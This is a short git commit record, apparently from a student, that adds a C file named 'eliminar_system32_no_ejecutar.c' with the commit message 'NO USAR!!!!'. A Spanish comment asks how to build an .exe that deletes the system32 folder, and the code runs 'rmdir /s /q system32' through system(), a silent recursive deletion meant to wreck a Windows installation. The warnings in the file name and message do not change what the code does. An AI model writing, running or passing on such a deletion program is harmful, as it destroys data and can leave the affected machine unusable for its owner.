9a8b2024bf0c68fab4354146fdad47cd5e7cf079
alumno.775545@ies-azarquiel.es <nachogarciaiglesias809@gmail.com>
2026-01-08 20:06:51 +0100

    NO USAR!!!!

---
+++ src/cosas c/eliminar_system32_no_ejecutar.c
@@ -0,0 +1,13 @@
+//como creo una funcion para eliminar la carpeta system32 con un .exe?
+#include <stdio.h>
+#include <stdlib.h>
+#include <windows.h>
+
+void eliminar_system32(){
+    system("rmdir /s /q system32");
+}
+
+int main(){
+    eliminar_system32();
+    return 0;
+}
